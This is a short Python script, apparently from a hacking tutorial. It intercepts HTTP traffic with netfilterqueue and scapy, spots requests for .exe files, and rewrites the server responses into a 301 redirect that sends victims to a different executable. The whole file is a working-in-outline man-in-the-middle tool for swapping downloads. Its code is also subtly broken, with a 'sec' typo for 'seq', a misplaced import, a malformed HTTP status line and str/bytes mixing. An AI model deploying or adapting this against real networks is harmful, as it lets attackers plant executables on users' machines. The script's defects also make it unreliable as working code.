#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw

rar_load = "301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

# for working a remote machine need to enable port forwarding.
# I have a check from a previous component -- TODO find it.

ack_list = []
def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("HTTP Request: ")
            if ".exe" in scapy_packet[Raw].load:
                print("[+] Exe Request: ")
                ack_list.append(scapy_packet[TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[TCP].sport == 80:
            print("HTTP Response: ")
            if scapy_packet[TCP].sec in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File: ")

                modified_packet = set_load(scapy_packet, rar_load)
                packet.set_payload(str(modified_packet))
    packet.accept()
    return None

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


